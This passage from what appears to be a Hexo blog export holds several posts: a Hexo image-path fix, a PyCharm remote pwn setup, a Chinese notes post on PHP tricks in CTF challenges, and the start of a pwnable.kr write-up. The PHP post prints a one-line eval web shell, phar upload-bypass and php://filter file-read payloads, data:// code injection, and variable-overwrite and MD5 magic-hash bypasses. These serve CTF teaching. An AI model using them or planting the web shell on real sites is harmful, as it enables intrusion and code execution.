class="regexp">/http[s]*.*|\/\/.*/</span>.test(src) &amp;&amp;</span><br><span class="line">			   !<span class="regexp">/^\s*\//</span>.test(src)) &#123;</span><br><span class="line">			  <span class="comment">// For "about" page, the first part of "src" can't be removed.</span></span><br><span class="line">			  <span class="comment">// In addition, to support multi-level local directory.</span></span><br><span class="line">			  <span class="keyword">var</span> linkArray = link.split(<span class="string">'/'</span>).filter(<span class="function"><span class="keyword">function</span>(<span class="params">elem</span>)</span>&#123;</span><br><span class="line">				<span class="keyword">return</span> elem != <span class="string">''</span>;</span><br><span class="line">			  &#125;);</span><br><span class="line">			  <span class="keyword">var</span> srcArray = src.split(<span class="string">'/'</span>).filter(<span class="function"><span class="keyword">function</span>(<span class="params">elem</span>)</span>&#123;</span><br><span class="line">				<span class="keyword">return</span> elem != <span class="string">''</span> &amp;&amp; elem != <span class="string">'.'</span>;</span><br><span class="line">			  &#125;);</span><br><span class="line">			  <span class="keyword">if</span>(srcArray.length &gt; <span class="number">1</span>)</span><br><span class="line">				srcArray.shift();</span><br><span class="line">			  src = srcArray.join(<span class="string">'/'</span>);</span><br><span class="line">			  $(<span class="keyword">this</span>).attr(<span class="string">'src'</span>, config.root + link + src);</span><br><span class="line">			  <span class="built_in">console</span>.info&amp;&amp;<span class="built_in">console</span>.info(<span class="string">"update link as:--&gt;"</span>+config.root + link + src);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="built_in">console</span>.info&amp;&amp;<span class="built_in">console</span>.info(<span class="string">"no src attr, skipped..."</span>);</span><br><span class="line">			<span class="built_in">console</span>.info&amp;&amp;<span class="built_in">console</span>.info($(<span class="keyword">this</span>));</span><br><span class="line">		&#125;</span><br><span class="line">      &#125;);</span><br><span class="line">      data[key] = $.html();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<p>接着再去<code>hexo g -d</code>一下就能显示成功了。</p>
<p>hexo 3.0以上用户应该也可以选择直接卸载<code>hexo-asset-image</code>插件，直接使用官方的<code>相对路径引用的标签插件</code></p>
<blockquote>
<p><a href="https://hexo.io/zh-cn/docs/asset-folders.html" target="_blank" rel="noopener">资源文件夹</a></p>
<p>通过常规的 markdown 语法和相对路径来引用图片和其它资源可能会导致它们在存档页或者主页上显示不正确。在Hexo 2时代，社区创建了很多插件来解决这个问题。但是，随着Hexo 3 的发布，许多新的标签插件被加入到了核心代码中。这使得你可以更简单地在文章中引用你的资源。</p>
<p><code></code> <code></code> <code></code></p>
<p>比如说：当你打开文章资源文件夹功能后，你把一个 <code>example.jpg</code> 图片放在了你的资源文件夹中，如果通过使用相对路径的常规 markdown 语法 <code>![](/example.jpg)</code> ，它将 <em>不会</em> 出现在首页上。（但是它会在文章中按你期待的方式工作）</p>
<p>正确的引用图片方式是使用下列的标签插件而不是 markdown ：</p>
<p><code></code></p>
<p>通过这种方式，图片将会同时出现在文章和主页以及归档页中。</p>
</blockquote>
]]></content>
      <tags>
        <tag>hexo</tag>
        <tag>笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>Hello World</title>
    <url>/2019/05/30/hello-world/</url>
    <content><![CDATA[<p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p>
<h2 id="quick-start">Quick Start</h2>
<h3 id="create-a-new-post">Create a new post</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">"My New Post"</span></span><br></pre></td></tr></table></figure>
<p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p>
<h3 id="run-server">Run server</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
<p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p>
<h3 id="generate-static-files">Generate static files</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
<p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p>
<h3 id="deploy-to-remote-sites">Deploy to remote sites</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
<p>More info: <a href="https://hexo.io/docs/deployment.html" target="_blank" rel="noopener">Deployment</a></p>
]]></content>
  </entry>
  <entry>
    <title>使用PyCharm打造舒适的pwn环境</title>
    <url>/2019/07/29/pycharm/</url>
    <content><![CDATA[<h1 id="前言">前言</h1>
<p>弄了一天的vim+xshell，结果还是不尽人意，spacevim要求终端支持真彩色，但是xshell显然⑧行，将<code>enable_guicolors</code>设置为false后才勉强能看。</p>
<p>于是突发奇想，将pycharm通过ssh连接到虚拟机当中的python环境，能不能直接在主机上面写脚本调试，查了下还真有这个功能，不过需要pro版本。</p>
<h1 id="准备工作">准备工作</h1>
<ol type="1">
<li>PyCharm Pro</li>
<li>VMware Workstation</li>
<li>科学上网</li>
</ol>
<h1 id="配置">配置</h1>
<h2 id="主题">主题</h2>
<p>File-&gt;Settings..-&gt;Plugins，安装Material Theme UI，接着按照自己喜欢的来配就行</p>
<h2 id="配置ssh-interpreter">配置SSH Interpreter</h2>
<p>安装好PyCharm Pro之后，创建一个项目，创建好之后找到File-&gt;Settings..-&gt;Project: ctf-&gt;Project Interpreter配置python解释器</p>
<p><img src="https://i.loli.net/2020/08/30/ofdcXIjTHvFt7nK.png" alt="1564413576995" /></p>
<p>选择Add..-&gt;SSH Interpreter</p>
<p><img src="https://i.loli.net/2020/08/30/NSu85CFskzwqfU6.png" alt="1564413654784" /></p>
<p>将虚拟机的ip地址和用户名填写到相应的地方，然后NEXT。</p>
<p>填写密码</p>
<p><img src="https://i.loli.net/2020/08/30/ScGJNDETifOmtk8.png" alt="1564413731448" /></p>
<p>设置解释器路径和文件同步位置，然后FINISH</p>
<p><img src="https://i.loli.net/2020/08/30/VjULJRsEcaZ4YSG.png" alt="1564413752526" /></p>
<p>FINISH之后PyCharm会先进行一次同步，同步python库，并且把一些配置文件什么的给传过去，时间略长。</p>
<p>PyCharm的同步还有版本对比功能</p>
<p><img src="https://i.loli.net/2020/08/30/WgpeJOn1UwHv5ys.png" alt="1564414108066" /></p>
<p>不得不说比预想中还要好用。</p>
<h2 id="配置hexo">配置hexo</h2>
<p>File-&gt;Settings..-&gt;Tools-&gt;Terminal中可以设置PyCharm的终端</p>
<p>将Start directory设置为hexo根目录</p>
<p>shell path可以直接填写终端名称，例如powershell.exe</p>
<p>Tab name，标签名称，随便修改。</p>
<p><img src="https://i.loli.net/2020/08/30/yVahQxYj3LWFB9O.png" alt="1564414405852" /></p>
<p>这样就可以随时进行hexo的相关操作了。</p>
<h2 id="配置ssh-terminal">配置SSH Terminal</h2>
<p>File-&gt;Settings..-&gt;Tools-&gt;SSH Terminal</p>
<p><img src="https://i.loli.net/2020/08/30/Ly4EN3qnPTio2S1.png" alt="1564414758329" /></p>
<p>Deloyment server中选择root@xxx.xxx.xxx.xxx:22</p>
<p>这样每次打开就不需要再选一次了。</p>
<h1 id="faq">FAQ</h1>
<h2 id="pycharm中进行调试后console中输出">PyCharm中进行调试后，console中输出□=</h2>
<p>应该是PyCharm的问题，有两种解决办法：</p>
<ol type="1">
<li><p>Run-&gt;Edit Configurations..-&gt;Templates-&gt;Python-&gt;Enviroment variables中添加环境变量</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">PWNLIB_NOTERM=True</span><br></pre></td></tr></table></figure></li>
<li><p><del>修改<code>/usr/local/lib/python2.7/dist-packages/pwnlib/args.py</code>最后一行，注释掉<code>term.init()</code></del></p></li>
</ol>
<h1 id="总结">总结</h1>
<p>pro版本还是好用，配置好之后，直接在一个窗口中进行所有操作，不需要几个窗口之间来回切了，方便了不少。</p>
]]></content>
      <tags>
        <tag>IDE</tag>
      </tags>
  </entry>
  <entry>
    <title>CTF中的php套路</title>
    <url>/2019/07/09/php/</url>
    <content><![CDATA[<h2 id="md5">MD5()</h2>
<ol type="1">
<li><p>==判断</p>
<p>PHP在处理哈希字符串时，会利用”!=”或”==”来对哈希值进行比较，它把每一个以”0E”开头的哈希值都解释为0，所以如果两个不同的密码经过哈希以后，其哈希值都是以”0E”开头的，那么PHP将会认为他们相同，都是0。</p></li>
<li><p>===判断</p>
<p>MD5不能处理数组，构造?a[]=1&amp;b[]=2这样md5函数无法处理数组返回false完成匹配得到flag。</p></li>
</ol>
<h2 id="strcmp">strcmp</h2>
<blockquote>
<p>如果 str1 小于 str2 返回 &lt; 0； 如果 str1 大于 str2 返回 &gt; 0； 如果两者相等，返回 0。</p>
</blockquote>
<ul>
<li>5.2 中是将两个参数先转换成string类型。</li>
<li>5.3.3 以后，当比较数组和字符串的时候，返回是0。</li>
<li>5.5 中如果参数不是string类型，直接return了</li>
</ul>
<h2 id="php伪协议">php伪协议</h2>
<h3 id="phpinput">php://input</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">index.php?file=php:<span class="comment">//input</span></span><br><span class="line">POST:</span><br><span class="line"><span class="meta">&lt;?</span> phpinfo(); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="phpfilter">php://filter</h3>
<p>可以读取本地文件</p>
<p><code>index.php?file=php://filter/read=convert.base64-encode/resource=index.php</code></p>
<p>指定末尾文件，可以读到base64编码后的文件内容，ctf中常有题目可读文件源码。</p>
<p>如果不使用php://filter，要读取的文件扩展名是php的话，会直接解析，而不会显示出来内容</p>
<h3 id="phpphar">php://phar</h3>
<h4 id="绕过上传限制">绕过上传限制</h4>
<p>新建一个test.php，写入一句话</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//test.php</span></span><br><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>($_POST[<span class="string">"cmd"</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>将其压缩，后缀名改为.jpg。</p>
<p>然后使用phar协议读取文件。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;index.php?page&#x3D;phar:&#x2F;&#x2F;test.jpg&#x2F;test.php</span><br></pre></td></tr></table></figure>
<h5 id="例题">例题</h5>
<p>安恒11月赛：image_up</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;101.71.29.5:10007&#x2F;index.php?page&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;</span><br></pre></td></tr></table></figure>
<p>读取到以下文件源码</p>
<p>index.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'page'</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(!stristr($_GET[<span class="string">'page'</span>],<span class="string">".."</span>))&#123;</span><br><span class="line">      $page = $_GET[<span class="string">'page'</span>].<span class="string">".php"</span>;</span><br><span class="line">      <span class="keyword">include</span>($page);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">      header(<span class="string">"Location: index.php?page=login"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    header(<span class="string">"Location: index.php?page=login"</span>);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
<p>login.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'username'</span>])&amp;&amp;<span class="keyword">isset</span>($_POST[<span class="string">'password'</span>]))&#123;</span><br><span class="line">    header(<span class="string">"Location: index.php?page=upload"</span>);</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">  &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>upload.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $error = <span class="string">""</span>;</span><br><span class="line">    $exts = <span class="keyword">array</span>(<span class="string">"jpg"</span>,<span class="string">"png"</span>,<span class="string">"gif"</span>,<span class="string">"jpeg"</span>);</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">empty</span>($_FILES[<span class="string">"image"</span>]))</span><br><span class="line">    &#123;</span><br><span class="line">        $temp = explode(<span class="string">"."</span>, $_FILES[<span class="string">"image"</span>][<span class="string">"name"</span>]);</span><br><span class="line">        $extension = end($temp);</span><br><span class="line">        <span class="keyword">if</span>((@$_upfileS[<span class="string">"image"</span>][<span class="string">"size"</span>] &lt; <span class="number">102400</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(in_array($extension,$exts))&#123;</span><br><span class="line">              $path = <span class="string">"uploads/"</span>.md5($temp[<span class="number">0</span>].time()).<span class="string">"."</span>.$extension;</span><br><span class="line">              move_uploaded_file($_FILES[<span class="string">"image"</span>][<span class="string">"tmp_name"</span>], $path);</span><br><span class="line">              $error = <span class="string">"上传成功!"</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            $error = <span class="string">"上传失败！"</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">          $error = <span class="string">"文件过大，上传失败！"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>upload.php限制了上传文件类型，只能为<code>"jpg","png","gif","jpeg"</code>，使用phar伪协议绕过即可。</p>
<p>payload:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;index.php?page&#x3D;phar:&#x2F;&#x2F;.&#x2F;uploads&#x2F;6b19a5399b7d34fbb3c509ca8c25fd89.jpg&#x2F;shell</span><br></pre></td></tr></table></figure>
<p>因为index.php中会为请求的页面自动加上<code>.php</code>后缀，所以构造的payload不能写<code>.php</code>后缀。</p>
<h4 id="phar反序列化">phar反序列化</h4>
<p>参考<a href="https://paper.seebug.org/680/" target="_blank" rel="noopener">利用 phar 拓展 php 反序列化漏洞攻击面</a></p>
<h3 id="data">data://</h3>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">index.php?file&#x3D;data:text&#x2F;plain,&lt;?php phpinfo(); ?&gt;%00</span><br><span class="line">index.php?file&#x3D;data:text&#x2F;plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b</span><br></pre></td></tr></table></figure>
<h2 id="变量覆盖漏洞">变量覆盖漏洞</h2>
<h3 id="全局变量覆盖">全局变量覆盖</h3>
<p>条件：<code>register_globals = ON</code> 4.2.0后默认关闭 5.4.0后已移除 例题：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">"flag1.php"</span>;</span><br><span class="line">highlight_file(<span class="keyword">__file__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'args'</span>]))&#123;</span><br><span class="line">    $args = $_GET[<span class="string">'args'</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">"/^\w+$/"</span>,$args))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"args error!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">"var_dump($$args);"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>payload:<code>/index1.php?args=GLOBALS</code> 因为有eval("var_dump($$args);"); 直接用全局变量打印所有字符串即可得到flag</p>
<h3 id="导致的变量覆盖问题">$$导致的变量覆盖问题</h3>
<p>$$ 导致的变量覆盖问题在CTF代码审计题目中经常在foreach中出现，如以下的示例代码，使用foreach来遍历数组中的值，然后再将获取到的数组键名作为变量，数组中的键值作为变量的值。因此就产生了变量覆盖漏洞。请求?name=test 会将$name的值覆盖，变为test。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">   <span class="comment">//?name=test</span></span><br><span class="line">   </span><br><span class="line">   <span class="comment">//output:string(4) “name” string(4) “test” string(4) “test” test</span></span><br><span class="line">   </span><br><span class="line">   $name=’thinking’;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">foreach</span> ($_GET <span class="keyword">as</span> $key =&gt; $value)</span><br><span class="line">   &#123;</span><br><span class="line">       $$key = $value;</span><br><span class="line">   &#125;</span><br><span class="line">   var_dump($key);</span><br><span class="line">   var_dump($value);</span><br><span class="line">   var_dump($$key);</span><br><span class="line"></span><br><span class="line">   <span class="keyword">echo</span> $name;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<h4 id="例题-1">例题：</h4>
<h5 id="题目源码">题目源码：</h5>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">   <span class="keyword">include</span> “flag.php”;</span><br><span class="line"></span><br><span class="line">   $_403 = “Access Denied”;</span><br><span class="line"></span><br><span class="line">   $_200 = “Welcome Admin”;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">if</span> ($_SERVER[<span class="string">"REQUEST_METHOD"</span>] != “POST”)</span><br><span class="line">   &#123;</span><br><span class="line">         <span class="keyword">die</span>(“BugsBunnyCTF is here :p…”);</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">if</span> ( !<span class="keyword">isset</span>($_POST[<span class="string">"flag"</span>]) )</span><br><span class="line">   &#123;</span><br><span class="line">         <span class="keyword">die</span>($_403);</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">foreach</span> ($_GET <span class="keyword">as</span> $key =&gt; $value)</span><br><span class="line">   &#123;</span><br><span class="line">         $$key = $$value;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">foreach</span> ($_POST <span class="keyword">as</span> $key =&gt; $value)</span><br><span class="line">   &#123;</span><br><span class="line">         $$key = $value;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">if</span> ( $_POST[<span class="string">"flag"</span>] !== $flag )</span><br><span class="line">   &#123;</span><br><span class="line">         <span class="keyword">die</span>($_403);</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">echo</span> “This is your flag : “. $flag . “\n”;</span><br><span class="line">   <span class="keyword">die</span>($_200);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<h5 id="题目分析">题目分析：</h5>
<p>源码包含了<code>flag.php</code>文件，并且需要满足3个if里的条件才能获取flag，题目中使用了两个<code>foreach</code>并且也使用了<code>$$</code>两个<code>foreach</code>中对<code>$$key</code>的处理是不一样的，满足条件后会将<code>$flag</code>里面的值打印出来，所以<code>$flag</code>是在<code>flag.php</code>文件文件中的。</p>
<p>但是由于第7，11-14行间的代码会将flag的值给覆盖掉了，所以需要先将flag的值给覆盖掉了，所以需要先将flag的值赋给<code>200或200或_403</code>变量，然后利用<code>die(200)或die(200)或die(_403)</code>将flag打印出来。</p>
<h5 id="解题方法">解题方法：</h5>
<p>由于第7，11-14行间的代码会将<code>$flag</code>的值给覆盖掉，所以只能利用第一个foreach先将<code>$flag</code>的值赋给<code>$_200</code>，然后利用<code>die($_200)</code>将原本的flag值打印出来。</p>
<h5 id="最终payload">最终PAYLOAD：</h5>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GET DATA：?_200&#x3D;flag </span><br><span class="line"></span><br><span class="line">POST DATA：flag&#x3D;aaaaaaaaaaaaaaaaaaaaa</span><br></pre></td></tr></table></figure>
<h3 id="extract函数导致的变量覆盖问题">extract()函数导致的变量覆盖问题</h3>
<p><code>extract()</code>该函数使用数组键名作为变量名，使用数组键值作为变量值。针对数组中的每个元素，将在当前符号表中创建对应的一个变量。</p>
<p><code>extract()</code>的用法参考：http://www.runoob.com/php/func-array-extract.html</p>
<p>语法： <code>extract(array,extract_rules,prefix)</code></p>
<h4 id="例题-2">例题：</h4>
<h5 id="题目源码-1">题目源码：</h5>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$flag = ‘xxx’;</span><br><span class="line">extract($_GET);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($gift)) </span><br><span class="line">&#123;</span><br><span class="line">$content = trim(file_get_contents($flag));</span><br><span class="line"><span class="keyword">if</span> ($gift == $content) </span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> ‘hctf&#123;…&#125;’;</span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> ‘Oh..’;</span><br><span class="line">&#125;</span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<h5 id="题目分析-1">题目分析：</h5>
<p>题目使用了<code>extract($_GET)</code>接收了GET请求中的数据，并将键名和键值转换为变量名和变量的值，然后再进行两个if 的条件判断，所以可以使用GET提交参数和值，利用<code>extract()</code>对变量进行覆盖，从而满足各个条件。</p>
<h5 id="解题方法-1">解题方法：</h5>
<p>GET请求 ?flag=&amp;gift=，extract()会将flag和flag和gift的值覆盖了，将变量的值设置为空或者不存在的文件就满足gift==gift==content。</p>
<h5 id="最终payload-1">最终PAYLOAD：</h5>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GET DATA： ?flag&#x3D;&amp;gift&#x3D;</span><br></pre></td></tr></table></figure>
<h3 id="parse_str函数导致的变量覆盖问题">parse_str函数导致的变量覆盖问题</h3>
<p>parse_str() 函数用于把查询字符串解析到变量中，如果没有array 参数，则由该函数设置的变量将覆盖已存在的同名变量。</p>
<p>语法：parse_str(string,array)</p>
<h4 id="题目源码-2">题目源码：</h4>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">   error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">   <span class="keyword">if</span> (<span class="keyword">empty</span>($_GET[<span class="string">'id'</span>])) </span><br><span class="line">  &#123;</span><br><span class="line">        show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">  &#125; </span><br><span class="line">  <span class="keyword">else</span> </span><br><span class="line"> &#123;</span><br><span class="line">        <span class="keyword">include</span> (‘flag.php’);</span><br><span class="line">        $a = “www.OPENCTF.com </span><br><span class="line">        $id = $_GET[<span class="string">'id'</span>];</span><br><span class="line">        @parse_str($id);</span><br><span class="line">        <span class="keyword">if</span> ($a[<span class="number">0</span>] != ‘QNKCDZO’ &amp;&amp; md5($a[<span class="number">0</span>]) == md5(‘QNKCDZO’)) </span><br><span class="line">       &#123;</span><br><span class="line">             <span class="keyword">echo</span> $flag;</span><br><span class="line">       &#125; </span><br><span class="line">       <span class="keyword">else</span> </span><br><span class="line">       &#123;</span><br><span class="line">             <span class="keyword">exit</span>(‘其实很简单其实并不难！’);</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">   &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<h4 id="题目分析-2">题目分析：</h4>
<p>首先要求使用GET提交id参数，然后<code>parse_str($id)对id</code>参数的数据进行处理，再使用判断<code>a[0] != ‘QNKCDZO’ &amp;&amp; md5(a[0] != ‘QNKCDZO’ &amp;&amp; md5(a[0]) == md5(‘QNKCDZO’)</code>的结果是否为真，为真就返回flag，<code>md5(‘QNKCDZO’)</code>的结果是<code>0e830400451993494058024219903391</code>由于此次要满足<code>a[0] != ‘QNKCDZO’ &amp;&amp; md5(a[0] != ‘QNKCDZO’ &amp;&amp; md5(a[0]) == md5(‘QNKCDZO’)</code>所以要利用php弱语言特性，0e123会被当做科学计数法，0 * 10 x 123。所以需要找到一个字符串md5后的结果是0e开头后面都是数字的，如，240610708，s878926199a</p>
<p>PHP处理0e开头md5哈希字符串缺陷/bug 参考：http://www.cnblogs.com/Primzahl/p/6018158.html</p>
<h4 id="解题方法-2">解题方法：</h4>
<p>使用GET请求id=a[0]=240610708，这样会将a[0]的值覆盖为<code>240610708</code>，然后经过md5后得到<code>0e462097431906509019562988736854与md5(‘QNKCDZO’)</code>的结果<code>0e830400451993494058024219903391</code>比较都是0 所以相等，满足条件，得打flag。</p>
<h4 id="最终payload-2">最终PAYLOAD：</h4>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GET DATA:</span><br><span class="line"></span><br><span class="line">?id&#x3D;a[0]&#x3D;s878926199a</span><br><span class="line"></span><br><span class="line">or</span><br><span class="line"></span><br><span class="line">?id&#x3D;a[0]&#x3D;240610708</span><br></pre></td></tr></table></figure>
]]></content>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>pwnable writeup</title>
    <url>/2019/08/08/pwnable/</url>
    <content><![CDATA[<h1 id="toddlers-bottle">Toddler's Bottle</h1>
<h2 id="fd">fd</h2>
<h3 id="题目描述">题目描述</h3>
<p>Mommy! what is a file descriptor in Linux?</p>
<ul>
<li>try to play the wargame your self but if you are ABSOLUTE beginner, follow this tutorial link: https://youtu.be/971eZhMHQQw</li>
</ul>
<p>ssh fd@pwnable.kr -p2222 (pw:guest)</p>
<h3 id="题目解析">题目解析</h3>
<p>先了解下fd是什么东西</p>
<blockquote>
<p>fd(file descriptor)，文件描述符</p>
<p><a href="https://baike.baidu.com/item/内核/108410" target="_blank" rel="noopener">内核</a>（kernel）利用文件描述符（file descriptor）来访问文件。文件描述符是非负整数。打开现存文件或新建文件时，内核会返回一个文件描述符。读写文件也需要使用文件描述符来指定待读写的文件。</p>
<p>习惯上，标准输入（standard input）的文件描述符是 0，标准输出（standard output）是 1，标准错误（standard error）是 2。</p>
</blockquote>
<p>ssh连接上题目，查看题目代码</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="keyword">char</span> buf[<span class="number">32</span>];</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[], <span class="keyword">char</span>* envp[])</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(argc&lt;<span class="number">2</span>)&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"pass argv[1] a number\n"</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span> fd = atoi( argv[<span class="number">1</span>] ) - <span class="number">0x1234</span>;</span><br><span class="line">        <span class="keyword">int</span> len = <span class="number">0</span>;</span><br><span class="line">        len = read(fd, buf, <span class="number">32</span>);</span><br><span class="line">        <span class="keyword">if</span>(!<span class="built_in">strcmp</span>(<span class="string">"LETMEWIN\n"</span>, buf))&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"good job :)\n"</span>);</span><br><span class="line">                system(<span class="string">"/bin/cat flag"</span>);</span><br><span class="line">                <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"learn about Linux file IO\n"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>令fd为0(stdin)，再输入LETMEWIN就可以得到flag。</p>
<p><strong>payload</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.&#x2F;fd 4660</span><br><span class="line">input：LETMEWIN</span><br></pre></td></tr></table></figure>
<h2 id="collision">collision</h2>
<h3 id="题目描述-1">题目描述</h3>
<p>Daddy told me about cool MD5 hash collision today. I wanna do something like that too!</p>
<p>ssh col@pwnable.kr -p2222 (pw:guest)</p>
<h3 id="题目解析-1">题目解析</h3>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> hashcode = <span class="number">0x21DD09EC</span>;</span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="title">check_password</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>* p)</span></span>&#123;</span><br><span class="line">        <span class="keyword">int</span>* ip = (<span class="keyword">int</span>*)p;</span><br><span class="line">        <span class="keyword">int</span> i;</span><br><span class="line">        <span class="keyword">int</span> res=<span class="number">0</span>;</span><br><span class="line">        